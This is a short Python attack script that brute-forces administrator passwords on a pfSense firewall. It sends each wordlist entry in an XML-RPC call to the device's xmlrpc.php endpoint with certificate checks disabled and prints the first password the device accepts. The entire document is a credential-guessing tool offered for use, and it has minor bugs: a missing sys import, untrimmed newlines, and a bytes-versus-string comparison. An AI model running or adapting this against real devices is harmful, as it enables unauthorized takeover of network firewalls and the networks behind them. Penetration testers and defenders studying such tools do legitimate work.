#!/usr/bin/env python

import argparse
import requests
import random

requests.packages.urllib3.disable_warnings()
parser = argparse.ArgumentParser()
parser.add_argument("--rhost", help = "Target Uri https://127.0.0.1")
parser.add_argument("--list", help = "Password list")
args = parser.parse_args()

rhost = args.rhost
list = args.list
file = open(list, 'r')
Lines = file.readlines()

for i in Lines:

	command = "<?xml version='1.0' encoding='iso-8859-1'?>"
	command += "<methodCall>"
	command += "<methodName>pfsense.host_firmware_version</methodName>"
	command += "<params>"
	command += "<param><value><string>"+i+"</string></value></param>"
	command += "</params>"
	command += "</methodCall>"
	url = rhost + "/xmlrpc.php"
	page = requests.post(url, data=command, verify=False, headers={"Content-Type":"application/xml"})
	if "Authentication failed" in page.content:
		print("no")
	else:
		print("found password "+i)
		sys.exit(0)
